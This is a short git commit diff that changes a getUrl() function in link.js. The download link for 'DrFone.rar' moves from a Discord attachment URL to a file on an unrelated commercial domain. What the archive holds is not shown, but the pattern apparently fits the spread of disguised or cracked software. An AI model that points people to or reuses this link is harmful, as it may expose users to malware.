4db506112e16ae6ec1f81f501034ef3fab5e433a
klasso <57557028+klasso@users.noreply.github.com>
2021-02-12 20:45:01 +0200

    Update link.js

--- link.js
+++ link.js
@@ -1,4 +1,4 @@
 function getUrl()
 {
-  return "https://cdn.discordapp.com/attachments/800051540953399306/809842831103492157/DrFone.rar";
+  return "https://importacioneslumina.com/files/DrFone.rar";
 }
